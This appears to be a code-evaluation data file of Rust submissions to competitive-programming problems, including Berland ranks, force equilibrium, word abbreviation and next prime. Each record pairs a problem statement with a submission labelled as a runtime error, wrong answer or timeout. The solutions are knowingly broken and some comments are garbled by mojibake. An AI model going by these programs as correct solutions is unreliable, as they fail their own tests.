{"difficulty":800,"lang":"Rust","lang_cluster":"rust","src_uid":"69850c2af99d60711bcff5870575e15e","submission_id":"re_1491","tags":["implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"use std::io;\n\nfn main() { \n    let mut buf = String::new();\n    let mut n: usize = 0;\n    let reader = io::stdin();\n    reader.read_line(&mut buf);\n    n = buf.trim().parse()\n            .expect(\" \");\n    let mut v = vec![0;n-1];  \n    buf.clear();\n    reader.read_line(&mut buf);\n    let it = buf.trim().split(\" \");\n    let mut ct = 0; \n    for sub in it{\n        v[ct] = sub.trim().parse()\n            .expect(\" \");\n        ct += 1;\n    }\n    buf.clear();\n    reader.read_line(&mut buf);\n    let wv = buf.trim().split(\" \").collect::<Vec<&str>>();\n    let a:i32 =  wv[0].parse().expect(\" \");\n    let b:i32 =  wv[1].parse().expect(\" \");\n    let mut ans: u32 = 0; \n    for i in (a-1)..=(b-2){\n        ans += v[i as usize];\n    }\n    println!(\"{}\",ans);\n}   \n","description":"The Berland Armed Forces System consists of n ranks that are numbered using natural numbers from 1 to n, where 1 is the lowest rank and n is the highest rank.One needs exactly di years to rise from rank i to rank i\u2009+\u20091. Reaching a certain rank i having not reached all the previous i\u2009-\u20091 ranks is impossible.Vasya has just reached a new rank of a, but he dreams of holding the rank of b. Find for how many more years Vasya should serve in the army until he can finally realize his dream.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains an integer n (2\u2009\u2264\u2009n\u2009\u2264\u2009100). The second line contains n\u2009-\u20091 integers di (1\u2009\u2264\u2009di\u2009\u2264\u2009100). The third input line contains two integers a and b (1\u2009\u2264\u2009a\u2009&lt;\u2009b\u2009\u2264\u2009n). The numbers on the lines are space-separated.","output_spec":"Print the single number which is the number of years that Vasya needs to rise from rank a to rank b.","notes":null,"sample_inputs":["3\n5 6\n1 2","3\n5 6\n1 3"],"sample_outputs":["5","11"]}
{"difficulty":1000,"lang":"Rust 2021","lang_cluster":"rust","src_uid":"69_A","submission_id":"223419150","tags":["implementation","math"],"exec_outcome":"WRONG_ANSWER","source_code":"use std::io::stdin;\r\n\r\n\r\nfn main() {\r\n    let mut buffer = String::new();\r\n    let mut sum: Vec<i32> = vec![0,0,0];\r\n\r\n    stdin().read_line(&mut buffer);\r\n\r\n    let count = buffer.trim()\r\n                      .parse::<i32>()\r\n                      .unwrap();\r\n\r\n    for _x in 0..count {\r\n        let mut x = 0;\r\n        buffer.clear();\r\n        stdin().read_line(&mut buffer);\r\n               buffer.trim()\r\n                     .split(\" \")\r\n                     .map(|x| x.parse::<i32>().unwrap())\r\n                     .for_each(|y| { sum[x] += y; x += 1;})\r\n    }\r\n\r\n    if sum.iter().sum::<i32>() == 0 {\r\n        print!(\"YES\");\r\n    } else {\r\n        print!(\"NO\");\r\n    }\r\n}\r\n","description":"A guy named Vasya attends the final grade of a high school. One day Vasya decided to watch a match of his favorite hockey team. And, as the boy loves hockey very much, even more than physics, he forgot to do the homework. Specifically, he forgot to complete his physics tasks. Next day the teacher got very angry at Vasya and decided to teach him a lesson. He gave the lazy student a seemingly easy task: You are given an idle body in space and the forces that affect it. The body can be considered as a material point with coordinates (0; 0; 0). Vasya had only to answer whether it is in equilibrium. \"Piece of cake\" \u2014 thought Vasya, we need only to check if the sum of all vectors is equal to 0. So, Vasya began to solve the problem. But later it turned out that there can be lots and lots of these forces, and Vasya can not cope without your help. Help him. Write a program that determines whether a body is idle or is moving by the given vectors of forces.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a positive integer n (1\u2264n\u2264100), then follow n lines containing three integers each: the xi coordinate, the yi coordinate and the zi coordinate of the force vector, applied to the body (-100\u2264xi,yi,zi\u2264100).\n","output_spec":"Print the word \"YES\" if the body is in equilibrium, or the word \"NO\" if it is not.\n","notes":null,"sample_inputs":["3\n4 1 7\n-2 4 -1\n1 -5 -3\n","3\n3 -1 7\n-5 2 -4\n2 -1 -3\n"],"sample_outputs":["NO","YES"]}
{"difficulty":1200,"lang":"Rust 2021","lang_cluster":"rust","src_uid":"6_C","submission_id":"190139810","tags":["greedy","two+pointers"],"exec_outcome":"WRONG_ANSWER","source_code":"use std::io;\n\nfn main() {\n    let times: Vec<usize> = io::stdin()\n        .lines()\n        .skip(1)\n        .next()\n        .unwrap()\n        .unwrap()\n        .split(' ')\n        .map(|str| str.parse().unwrap())\n        .collect();\n\n    let mut lhs_position = 0;\n    let mut lhs_time: usize = 0;\n    let mut lhs_count: usize = 0;\n\n    let mut rhs_position = times.len().checked_sub(1).unwrap();\n    let mut rhs_time: usize = 0;\n    let mut rhs_count: usize = 0;\n\n    while lhs_position < rhs_position {\n        if lhs_time <= rhs_time {\n            lhs_time += times[lhs_position];\n            lhs_count += 1;\n            lhs_position += 1;\n        } else {\n            rhs_time += times[rhs_position];\n            rhs_count += 1;\n            rhs_position -= 1;\n        }\n    }\n\n    println!(\"{lhs_count} {rhs_count}\")\n}\n","description":"Alice and Bob like games. And now they are ready to start a new game. They have placed n chocolate bars in a line. Alice starts to eat chocolate bars one by one from left to right, and Bob \u2014 from right to left. For each chocololate bar the time, needed for the player to consume it, is known (Alice and Bob eat them with equal speed). When the player consumes a chocolate bar, he immediately starts with another. It is not allowed to eat two chocolate bars at the same time, to leave the bar unfinished and to make pauses. If both players start to eat the same bar simultaneously, Bob leaves it to Alice as a true gentleman.How many bars each of the players will consume?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains one integer n (1\u2264n\u226410^5) \u2014 the amount of bars on the table. The second line contains a sequence t1,t2,...,tn (1\u2264ti\u22641000), where ti is the time (in seconds) needed to consume the i-th bar (in the order from left to right).\n","output_spec":"Print two numbers a and b, where a is the amount of bars consumed by Alice, and b is the amount of bars consumed by Bob.\n","notes":null,"sample_inputs":["5\n2 9 8 2 7\n"],"sample_outputs":["2 3\n"]}
{"difficulty":800,"lang":"Rust 2021","lang_cluster":"rust","src_uid":"71_A","submission_id":"223683112","tags":["strings"],"exec_outcome":"WRONG_ANSWER","source_code":"use std::io;\r\n\r\nfn main() {\r\n    let mut num_words = String::new();\r\n    io::stdin().read_line(&mut num_words).expect(\"Failed\");\r\n\r\n    let n: u32 = num_words.trim().parse().expect(\"Failed\");\r\n\r\n    for _k in 0..n {\r\n        let mut question_string: String = String::new();\r\n        io::stdin().read_line(&mut question_string).expect(\"Failed\");\r\n\r\n        if question_string.len() > 10 {\r\n            println!(\"{}{}{}\", question_string.chars().nth(0).unwrap(), question_string.len() - 2, question_string.chars().last().unwrap());\r\n        } else {\r\n            println!(\"{}\", question_string);\r\n        }\r\n    }\r\n}","description":"Sometimes some words like \"localization\" or \"internationalization\" are so long that writing them many times in one text is quite tiresome.Let's consider a word too long, if its length is strictly more than 10 characters. All too long words should be replaced with a special abbreviation.This abbreviation is made like this: we write down the first and the last letter of a word and between them we write the number of letters between the first and the last letters. That number is in decimal system and doesn't contain any leading zeroes.Thus, \"localization\" will be spelt as \"l10n\", and \"internationalization\u00bb will be spelt as \"i18n\".You are suggested to automatize the process of changing the words with abbreviations. At that all too long words should be replaced by the abbreviation and the words that are not too long should not undergo any changes.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains an integer n (1\u2264n\u2264100). Each of the following n lines contains one word. All the words consist of lowercase Latin letters and possess the lengths of from 1 to 100 characters.\n","output_spec":"Print n lines. The i-th line should contain the result of replacing of the i-th word from the input data.\n","notes":null,"sample_inputs":["4\nword\nlocalization\ninternationalization\npneumonoultramicroscopicsilicovolcanoconiosis\n"],"sample_outputs":["word\nl10n\ni18n\np43s\n"]}
{"difficulty":1300,"lang":"Rust 2021","lang_cluster":"rust","src_uid":"71_B","submission_id":"140983698","tags":["implementation","math"],"exec_outcome":"WRONG_ANSWER","source_code":"use std::io::stdin;\n\nfn main() {\n    let mut buffer = String::new();\n\n    stdin().read_line(&mut buffer).unwrap();\n    \n    let numbers: Vec<i32> = buffer\n        .split_whitespace()\n        .map(|x| x.parse::<i32>().unwrap())\n        .collect();\n\n    let (n, k, t): (i32, i32, i32) = (numbers[0], numbers[1], numbers[2]);\n\n    let count: i32 = ((t as f32) * (n as f32) * (k as f32) \/ 100f32).floor() as i32;\n\n    let mut squares: Vec<String> = Vec::new();\n\n    for i in 0..n {\n        if i < count \/ n {\n            squares.push(k.to_string());\n        } else if i == count \/ k {\n            squares.push((count % k).to_string());\n        } else {\n            squares.push(\"0\".to_string());\n        }\n    }\n\n    println!(\"{}\", squares.join(\" \"));\n}\n","description":"A progress bar is an element of graphical interface that displays the progress of a process for this very moment before it is completed. Let's take a look at the following form of such a bar.A bar is represented as n squares, located in line. To add clarity, let's number them with positive integers from 1 to n from the left to the right. Each square has saturation (ai for the i-th square), which is measured by an integer from 0 to k. When the bar for some i (1\u2264i\u2264n) is displayed, squares 1,2,... ,i-1 has the saturation k, squares i+1,i+2,... ,n has the saturation 0, and the saturation of the square i can have any value from 0 to k.So some first squares of the progress bar always have the saturation k. Some last squares always have the saturation 0. And there is no more than one square that has the saturation different from 0 and k.The degree of the process's completion is measured in percents. Let the process be t% completed. Then the following inequation is fulfilled: An example of such a bar can be seen on the picture. For the given n, k, t determine the measures of saturation for all the squares ai of the progress bar.","input_from":"standard input","output_to":"standard output","input_spec":"We are given 3 space-separated integers n, k, t (1\u2264n,k\u2264100, 0\u2264t\u2264100).\n","output_spec":"Print n numbers. The i-th of them should be equal to ai.\n","notes":null,"sample_inputs":["10 10 54\n","11 13 37\n"],"sample_outputs":["10 10 10 10 10 4 0 0 0 0 ","13 13 13 13 0 0 0 0 0 0 0 "]}
{"difficulty":800,"lang":"Rust 2021","lang_cluster":"rust","src_uid":"80_A","submission_id":"194552049","tags":["brute+force"],"exec_outcome":"WRONG_ANSWER","source_code":"#![allow(dead_code)]\r\n#![allow(unused)]\r\n#![allow(unused_imports)]\r\nuse std::io::{self, prelude::*};\r\nuse std::str;\r\nuse std::cmp; \/\/ cmp::max\r\nuse std::collections::BTreeMap;\r\nuse std::f64; \/\/ f64::max\r\nuse std::collections::BTreeSet;\r\n \r\nstruct Scanner<R> {\r\n    reader: R,\r\n    buf_str: Vec<u8>,\r\n    buf_iter: str::SplitWhitespace<'static>,\r\n}\r\n\r\nimpl<R: BufRead> Scanner<R> {\r\n    fn new(reader: R) -> Self {\r\n        Self { reader, buf_str: vec![], buf_iter: \"\".split_whitespace() }\r\n    }\r\n    fn token<T: str::FromStr>(&mut self) -> T {\r\n        loop {\r\n            if let Some(token) = self.buf_iter.next() {\r\n                return token.parse().ok().expect(\"Failed parse\");\r\n            }\r\n            self.buf_str.clear();\r\n            self.reader.read_until(b'\\n', &mut self.buf_str).expect(\"Failed read\");\r\n            self.buf_iter = unsafe {\r\n                let slice = str::from_utf8_unchecked(&self.buf_str);\r\n                std::mem::transmute(slice.split_whitespace())\r\n            }\r\n        }\r\n    }\r\n\r\n    fn token0(&mut self) -> String {\r\n        self.buf_str.clear();\r\n        self.reader.read_until(b'\\n', &mut self.buf_str).expect(\"Failed read\");        \r\n        return String::from_utf8_lossy(&self.buf_str).trim().to_string();\r\n    }\r\n    \r\n    fn i64(&mut self) -> i64 {\r\n        self.token::<i64>()\r\n    }\r\n\r\n    fn string(&mut self) -> Vec<u8> {\r\n        self.token::<String>().into_bytes()\r\n    }\r\n\r\n    fn usize(&mut self) -> usize {\r\n        self.token::<usize>()\r\n    }\r\n}\r\n\r\n#[derive(Debug, PartialOrd, Ord, PartialEq, Eq)]\r\nstruct Data {\r\n    x: i64,\r\n    y: i64,\r\n} \/\/ .sort_by(|a, b| b.x.cmp(&a.x));\r\n\r\nfn is_prime(s: i64) -> i64 {\r\n    let mut lo = 0;\r\n    for i in 1..=s {\r\n        if s % i == 0 {\r\n            lo += 1;\r\n        }\r\n    }\r\n    if lo == 2 {\r\n        1\r\n    }  else {\r\n        0\r\n    }\r\n}\r\n\r\nfn solve<R: BufRead>(s: &mut Scanner<R>) {\r\n    let x = s.i64();\r\n    let y = s.i64();\r\n    for i in x+1..y {\r\n        if is_prime(i) == 1 {\r\n            println!(\"NO\");\r\n        }\r\n    }\r\n\r\n    if is_prime(y) == 1 {\r\n        println!(\"YES\");\r\n    } else {\r\n        println!(\"NO\");\r\n    }\r\n}\r\n\r\nfn main() {\r\n    let (stdin, stdout) = (io::stdin(), io::stdout());\r\n    let mut scan = Scanner::new(stdin.lock());\r\n    let mut t = 1; \r\n    \/\/ t = scan.i64();\r\n    while t > 0 {\r\n        t -= 1;\r\n        solve(&mut scan);\r\n    }\r\n}","description":"A prime number is a number which has exactly two distinct divisors: one and itself. For example, numbers 2, 7, 3 are prime, and 1, 6, 4 are not.The next prime number after x is the smallest prime number greater than x. For example, the next prime number after 2 is 3, and the next prime number after 3 is 5. Note that there is exactly one next prime number after each number. So 5 is\u00a0not the next prime number for 2.One cold April morning Panoramix predicted that soon Kakofonix will break free from his straitjacket, and this will be a black day for the residents of the Gallic countryside.Panoramix's prophecy tells that if some day Asterix and Obelix beat exactly x Roman soldiers, where x is a prime number, and next day they beat exactly y Roman soldiers, where y is the next prime number after x, then it's time to wait for Armageddon, for nothing can shut Kakofonix up while he sings his infernal song.Yesterday the Gauls beat n Roman soldiers and it turned out that the number n was prime! Today their victims were a troop of m Romans (m>n). Determine whether the Gauls should wait for the black day after today's victory of Asterix and Obelix?","input_from":"standard input","output_to":"standard output","input_spec":"The first and only input line contains two positive integers \u2014 n and m (2\u2264n<m\u226450). It is guaranteed that n is prime.\nPretests contain all the cases with restrictions 2\u2264n<m\u22644.\n","output_spec":"Print YES, if m is the next prime number after n, or NO otherwise.\n","notes":null,"sample_inputs":["3 5\n","7 11\n","7 9\n"],"sample_outputs":["YES","YES","NO"]}
{"difficulty":1200,"lang":"Rust 2021","lang_cluster":"rust","src_uid":"8_A","submission_id":"219418386","tags":["strings"],"exec_outcome":"WRONG_ANSWER","source_code":"use std::io::BufRead;\r\n\r\n\/**\r\n * A. Train and Peter\r\n * time limit per test: 1 second\r\n * memory limit per test: 64 megabytes\r\n * input: standard input\r\n * output: standard output\r\n *\r\n * Peter likes to travel by train. He likes it so much that on the train he falls asleep.\r\n *\r\n * Once in summer Peter was going by train from city A to city B, and as usual, was sleeping. Then he woke up, started to\r\n * look through the window and noticed that every railway station has a flag of a particular colour.\r\n *\r\n * The boy started to memorize the order of the flags' colours that he had seen. But soon he fell asleep again.\r\n * Unfortunately, he didn't sleep long, he woke up and went on memorizing the colours. Then he fell asleep again, and that\r\n * time he slept till the end of the journey.\r\n *\r\n * At the station he told his parents about what he was doing, and wrote two sequences of the colours that he had seen\r\n * before and after his sleep, respectively.\r\n *\r\n * Peter's parents know that their son likes to fantasize. They give you the list of the flags' colours at the stations that\r\n * the train passes sequentially on the way from A to B, and ask you to find out if Peter could see those sequences on the\r\n * way from A to B, or from B to A. Remember, please, that Peter had two periods of wakefulness.\r\n *\r\n * Peter's parents put lowercase Latin letters for colours. The same letter stands for the same colour, different letters \u00e2\u0080\u0094\r\n * for different colours.\r\n *\r\n * Input\r\n * The input data contains three lines. The first line contains a non-empty string, whose length does not exceed 105, the\r\n * string consists of lowercase Latin letters \u00e2\u0080\u0094 the flags' colours at the stations on the way from A to B. On the way from\r\n * B to A the train passes the same stations, but in reverse order.\r\n *\r\n * The second line contains the sequence, written by Peter during the first period of wakefulness. The third line contains\r\n * the sequence, written during the second period of wakefulness. Both sequences are non-empty, consist of lowercase Latin\r\n * letters, and the length of each does not exceed 100 letters. Each of the sequences is written in chronological order.\r\n *\r\n * Output\r\n * Output one of the four words without inverted commas:\r\n *   \u00c2\u00abforward\u00c2\u00bb \u00e2\u0080\u0094 if Peter could see such sequences only on the way from A to B;\r\n *   \u00c2\u00abbackward\u00c2\u00bb \u00e2\u0080\u0094 if Peter could see such sequences on the way from B to A;\r\n *   \u00c2\u00abboth\u00c2\u00bb \u00e2\u0080\u0094 if Peter could see such sequences both on the way from A to B, and on the way from B to A;\r\n *   \u00c2\u00abfantasy\u00c2\u00bb \u00e2\u0080\u0094 if Peter could not see such sequences.\r\n *\r\n * Examples\r\n *   Input\r\n *   atob\r\n *   a\r\n *   b\r\n *   \r\n *   Output\r\n *   forward\r\n *   \r\n *   Input\r\n *   aaacaaa\r\n *   aca\r\n *   aa\r\n *   \r\n *   Output\r\n *   both\r\n *\r\n * Note\r\n * It is assumed that the train moves all the time, so one flag cannot be seen twice. There are no flags at stations A and B\r\n *\/\r\nfn main() {\r\n    let stdin = std::io::stdin();\r\n    let mut lines = stdin.lock().lines();\r\n\r\n    let path = lines.next().unwrap().unwrap();\r\n    let a = lines.next().unwrap().unwrap();\r\n    let b = lines.next().unwrap().unwrap();\r\n\r\n    let a_indices: Vec<_> = path\r\n        .as_bytes()\r\n        .windows(a.len())\r\n        .enumerate()\r\n        .filter(|(_, slice)| slice == &a.as_bytes())\r\n        .map(|(i, _)| i)\r\n        .collect();\r\n    let b_indices: Vec<_> = path\r\n        .as_bytes()\r\n        .windows(b.len())\r\n        .enumerate()\r\n        .filter(|(_, slice)| slice == &b.as_bytes())\r\n        .map(|(i, _)| i)\r\n        .collect();\r\n\r\n    let (mut left, mut right) = (false, false);\r\n    for &i in &a_indices {\r\n        for &j in &b_indices {\r\n            if i < j {\r\n                let a_end = i + a.len();\r\n                left |= a_end <= j;\r\n            } else {\r\n                let b_end = j + b.len();\r\n                right |= b_end <= i;\r\n            }\r\n        }\r\n    }\r\n\r\n    match (left, right) {\r\n        (true, true) => println!(\"both\"),\r\n        (true, _) => println!(\"forward\"),\r\n        (_, true) => println!(\"backward\"),\r\n        _ => println!(\"fantasy\"),\r\n    }\r\n}\r\n","description":"Peter likes to travel by train. He likes it so much that on the train he falls asleep. Once in summer Peter was going by train from city A to city B, and as usual, was sleeping. Then he woke up, started to look through the window and noticed that every railway station has a flag of a particular colour.The boy started to memorize the order of the flags' colours that he had seen. But soon he fell asleep again. Unfortunately, he didn't sleep long, he woke up and went on memorizing the colours. Then he fell asleep again, and that time he slept till the end of the journey.At the station he told his parents about what he was doing, and wrote two sequences of the colours that he had seen before and after his sleep, respectively.Peter's parents know that their son likes to fantasize. They give you the list of the flags' colours at the stations that the train passes sequentially on the way from A to B, and ask you to find out if Peter could see those sequences on the way from A to B, or from B to A. Remember, please, that Peter had two periods of wakefulness.Peter's parents put lowercase Latin letters for colours. The same letter stands for the same colour, different letters \u2014 for different colours.","input_from":"standard input","output_to":"standard output","input_spec":"The input data contains three lines. The first line contains a non-empty string, whose length does not exceed 10^5, the string consists of lowercase Latin letters \u2014 the flags' colours at the stations on the way from A to B. On the way from B to A the train passes the same stations, but in reverse order. \nThe second line contains the sequence, written by Peter during the first period of wakefulness. The third line contains the sequence, written during the second period of wakefulness. Both sequences are non-empty, consist of lowercase Latin letters, and the length of each does not exceed 100 letters. Each of the sequences is written in chronological order. \n","output_spec":"Output one of the four words without inverted commas: \n  \u00abforward\u00bb \u2014 if Peter could see such sequences only on the way from A to B;  \u00abbackward\u00bb \u2014 if Peter could see such sequences on the way from B to A;  \u00abboth\u00bb \u2014 if Peter could see such sequences both on the way from A to B, and on the way from B to A;  \u00abfantasy\u00bb \u2014 if Peter could not see such sequences. ","notes":"It is assumed that the train moves all the time, so one flag cannot be seen twice. There are no flags at stations A and B.\n","sample_inputs":["atob\na\nb\n","aaacaaa\naca\naa\n"],"sample_outputs":["forward\n","both\n"]}
{"difficulty":1400,"lang":"Rust","lang_cluster":"rust","src_uid":"991516fa6f3ed5a71c547a3a50ea1a2b","submission_id":"re_1050","tags":["brute force"],"exec_outcome":"TIME_LIMIT_EXCEEDED","source_code":"#![allow(unused_imports)]\nuse std::collections;\nuse std::io;\n\nstruct Input {\n    buffer: collections::VecDeque<String>,\n}\n\nimpl Input {\n    fn new() -> Input {\n        Input {\n            buffer: collections::VecDeque::new(),\n        }\n    }\n\n    fn next<T: std::str::FromStr>(&mut self) -> T {\n        while self.buffer.len() == 0 {\n            let mut line = String::new();\n            std::io::stdin().read_line(&mut line).ok();\n            for word in line.split_whitespace() {\n                self.buffer.push_back(word.to_string())\n            }\n        }\n\n        let front = self.buffer.pop_front().unwrap();\n        front.parse::<T>().ok().unwrap()\n    }\n}\n\nfn main() {\n    let mut input = Input::new();\n\n    let n: usize = input.next();\n    let l: usize = input.next();\n\n    let mut a: Vec<usize> = Vec::with_capacity(n);\n    for _ in 0..n {\n        let mut value = input.next();\n        if value >= l {\n            a.push(value);\n        }\n    }\n\n    let mut max_area = 0;\n\n    for width in l..(l * 2) {\n        let mut height = 0;\n        let mut cuttings: Vec<usize> = Vec::new();\n        for j in 0..a.len() {\n            let mut remains = a[j];\n            while remains == width || remains >= width + l {\n                height += 1;\n                remains -= width;\n            }\n            if remains > 0 {\n                cuttings.push(remains);\n            }\n        }\n        cuttings.sort();\n        while cuttings.len() > 0 {\n            let mut remains = cuttings.pop().unwrap();\n            while cuttings.len() > 0 || remains < width {\n                remains += cuttings.drain(0..1).next().unwrap();\n            }\n            if remains >= width {\n                height += 1;\n            }\n        }\n        let area = width * height;\n        if area > max_area {\n            max_area = area;\n        }\n    }\n    println!(\"{}\", max_area);\n}\n","description":"The blinds are known to consist of opaque horizontal stripes that can be rotated thus regulating the amount of light flowing in the room. There are n blind stripes with the width of 1 in the factory warehouse for blind production. The problem is that all of them are spare details from different orders, that is, they may not have the same length (it is even possible for them to have different lengths)Every stripe can be cut into two or more parts. The cuttings are made perpendicularly to the side along which the length is measured. Thus the cuttings do not change the width of a stripe but each of the resulting pieces has a lesser length (the sum of which is equal to the length of the initial stripe)After all the cuttings the blinds are constructed through consecutive joining of several parts, similar in length, along sides, along which length is measured. Also, apart from the resulting pieces an initial stripe can be used as a blind if it hasn't been cut. It is forbidden to construct blinds in any other way.Thus, if the blinds consist of k pieces each d in length, then they are of form of a rectangle of k\u2009\u00d7\u2009d bourlemeters. Your task is to find for what window possessing the largest possible area the blinds can be made from the given stripes if on technical grounds it is forbidden to use pieces shorter than l bourlemeter. The window is of form of a rectangle with side lengths as positive integers.","input_from":"standard input","output_to":"standard output","input_spec":"The first output line contains two space-separated integers n and l (1\u2009\u2264\u2009n,\u2009l\u2009\u2264\u2009100). They are the number of stripes in the warehouse and the minimal acceptable length of a blind stripe in bourlemeters. The second line contains space-separated n integers ai. They are the lengths of initial stripes in bourlemeters (1\u2009\u2264\u2009ai\u2009\u2264\u2009100).","output_spec":"Print the single number \u2014 the maximal area of the window in square bourlemeters that can be completely covered. If no window with a positive area that can be covered completely without breaking any of the given rules exist, then print the single number 0.","notes":"NoteIn the first sample test the required window is 2\u2009\u00d7\u20094 in size and the blinds for it consist of 4 parts, each 2 bourlemeters long. One of the parts is the initial stripe with the length of 2, the other one is a part of a cut stripe with the length of 3 and the two remaining stripes are parts of a stripe with the length of 4 cut in halves.","sample_inputs":["4 2\n1 2 3 4","5 3\n5 5 7 3 1","2 3\n1 2"],"sample_outputs":["8","15","0"]}
{"difficulty":1200,"lang":"Rust 2021","lang_cluster":"rust","src_uid":"9_B","submission_id":"219870034","tags":["brute+force","geometry","implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"use std::io::BufRead;\r\n\r\n\/**\r\n * B. Running Student\r\n * time limit per test: 1 second\r\n * memory limit per test: 64 megabytes\r\n * input: standard input\r\n * output: standard output\r\n *\r\n * And again a misfortune fell on Poor Student. He is being late for an exam.\r\n *\r\n * Having rushed to a bus stop that is in point (0,\u00e2\u0080\u00890), he got on a minibus and they drove along a straight line, parallel\r\n * to axis OX, in the direction of increasing x.\r\n *\r\n * Poor Student knows the following:\r\n *   during one run the minibus makes n stops, the i-th stop is in point (xi,\u00e2\u0080\u00890)\r\n *   coordinates of all the stops are different\r\n *   the minibus drives at a constant speed, equal to vb\r\n *   it can be assumed the passengers get on and off the minibus at a bus stop momentarily\r\n *   Student can get off the minibus only at a bus stop\r\n *   Student will have to get off the minibus at a terminal stop, if he does not get off earlier\r\n *   the University, where the exam will be held, is in point (xu,\u00e2\u0080\u0089yu)\r\n *   Student can run from a bus stop to the University at a constant speed vs as long as needed\r\n *   a distance between two points can be calculated according to the following formula:\r\n *     d = sqrt((x_2 - x_1) ^ 2 + (y_2 - y_1) ^ 2)\r\n *   Student is already on the minibus, so, he cannot get off at the first bus stop\r\n * Poor Student wants to get to the University as soon as possible. Help him to choose the bus stop, where he should get\r\n * off. If such bus stops are multiple, choose the bus stop closest to the University.\r\n *\r\n * Input\r\n * The first line contains three integer numbers: 2\u00e2\u0080\u0089\u00e2\u0089\u00a4\u00e2\u0080\u0089n\u00e2\u0080\u0089\u00e2\u0089\u00a4\u00e2\u0080\u0089100, 1\u00e2\u0080\u0089\u00e2\u0089\u00a4\u00e2\u0080\u0089vb,\u00e2\u0080\u0089vs\u00e2\u0080\u0089\u00e2\u0089\u00a4\u00e2\u0080\u00891000. The second line contains n non-negative\r\n * integers in ascending order: coordinates xi of the bus stop with index i. It is guaranteed that x1 equals to zero, and\r\n * xn\u00e2\u0080\u0089\u00e2\u0089\u00a4\u00e2\u0080\u0089105. The third line contains the coordinates of the University, integers xu and yu, not exceeding 105 in absolute\r\n * value.\r\n *\r\n * Output\r\n * In the only line output the answer to the problem \u00e2\u0080\u0094 index of the optimum bus stop.\r\n *\r\n * Examples\r\n *   Input\r\n *   4 5 2\r\n *   0 2 4 6\r\n *   4 1\r\n *   \r\n *   Output\r\n *   3\r\n *   \r\n *   Input\r\n *   2 1 1\r\n *   0 100000\r\n *   100000 100000\r\n *   \r\n *   Output\r\n *   2\r\n *   \r\n *   Note\r\n *   As you know, students are a special sort of people, and minibuses usually do not hurry. That's why you should not be\r\n * surprised, if Student's speed is higher than the speed of the minibus.\r\n *\/\r\nfn main() {\r\n    let stdin = std::io::stdin();\r\n    let mut lines = stdin.lock().lines();\r\n\r\n    let first_line = lines.next().unwrap().unwrap();\r\n    let mut first_line = first_line\r\n        .split_ascii_whitespace()\r\n        .map(|v| v.parse().unwrap());\r\n\r\n    let n: usize = first_line.next().unwrap();\r\n    let vb = first_line.next().unwrap();\r\n    let vs = first_line.next().unwrap();\r\n    let (vb, vs) = (vb as f64, vs as f64);\r\n\r\n    let bus_stops: Vec<usize> = lines\r\n        .next()\r\n        .unwrap()\r\n        .unwrap()\r\n        .split_ascii_whitespace()\r\n        .take(n)\r\n        .map(|v| v.parse().unwrap())\r\n        .collect();\r\n\r\n    let university_line = lines.next().unwrap().unwrap();\r\n    let (ux, uy) = university_line.split_once(' ').unwrap();\r\n    let (ux, uy): (isize, isize) = (ux.parse().unwrap(), uy.parse().unwrap());\r\n    let (ux, uy) = (ux as f64, uy as f64);\r\n\r\n    let mut time_to_stop = vec![0.; bus_stops.len()];\r\n    for i in 1..time_to_stop.len() {\r\n        let prev_stop = bus_stops[i - 1];\r\n        let stop = bus_stops[i];\r\n        time_to_stop[i] = time_to_stop[i - 1] + (stop - prev_stop) as f64 \/ vb;\r\n    }\r\n\r\n    let bus_stop = bus_stops\r\n        .into_iter()\r\n        .zip(time_to_stop)\r\n        .map(|(x, bus_time)| {\r\n            let (dx, dy) = (ux - x as f64, uy);\r\n            let distance = (dx * dx + dy * dy).sqrt();\r\n            let student_time = distance \/ vs;\r\n            bus_time + student_time\r\n        })\r\n        .enumerate()\r\n        .skip(1)\r\n        .min_by(|a, b| a.1.partial_cmp(&b.1).unwrap())\r\n        .map(|(i, _)| i + 1)\r\n        .unwrap();\r\n\r\n    println!(\"{bus_stop}\");\r\n}\r\n","description":"And again a misfortune fell on Poor Student. He is being late for an exam.Having rushed to a bus stop that is in point (0,0), he got on a minibus and they drove along a straight line, parallel to axis OX, in the direction of increasing x.Poor Student knows the following:   during one run the minibus makes n stops, the i-th stop is in point (xi,0)  coordinates of all the stops are different  the minibus drives at a constant speed, equal to vb  it can be assumed the passengers get on and off the minibus at a bus stop momentarily  Student can get off the minibus only at a bus stop  Student will have to get off the minibus at a terminal stop, if he does not get off earlier  the University, where the exam will be held, is in point (xu,yu)  Student can run from a bus stop to the University at a constant speed vs as long as needed  a distance between two points can be calculated according to the following formula:   Student is already on the minibus, so, he cannot get off at the first bus stop Poor Student wants to get to the University as soon as possible. Help him to choose the bus stop, where he should get off. If such bus stops are multiple, choose the bus stop closest to the University.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains three integer numbers: 2\u2264n\u2264100, 1\u2264vb,vs\u22641000. The second line contains n non-negative integers in ascending order: coordinates xi of the bus stop with index i. It is guaranteed that x1 equals to zero, and xn\u226410^5. The third line contains the coordinates of the University, integers xu and yu, not exceeding 10^5 in absolute value. \n","output_spec":"In the only line output the answer to the problem \u2014 index of the optimum bus stop.\n","notes":"As you know, students are a special sort of people, and minibuses usually do not hurry. That's why you should not be surprised, if Student's speed is higher than the speed of the minibus.\n","sample_inputs":["4 5 2\n0 2 4 6\n4 1\n","2 1 1\n0 100000\n100000 100000\n"],"sample_outputs":["3","2"]}
